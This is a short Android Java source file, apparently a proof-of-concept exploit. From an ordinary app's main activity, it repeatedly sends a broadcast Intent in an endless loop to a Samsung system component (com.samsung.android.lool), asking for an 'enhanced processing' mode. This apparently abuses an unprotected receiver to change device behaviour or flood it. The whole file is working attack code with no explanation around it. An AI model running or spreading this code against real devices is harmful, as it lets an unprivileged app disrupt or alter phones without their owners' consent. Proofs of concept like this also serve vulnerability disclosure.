package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Thread(() -> {
            Intent i = new Intent("com.samsung.android.sm.ACTION_ENHANCED_PROCESSING_TILE");
            i.setPackage("com.samsung.android.lool");
            i.putExtra("mode", 2);
            while (true) {
                sendBroadcast(i);
            }
        }).start();
    }
}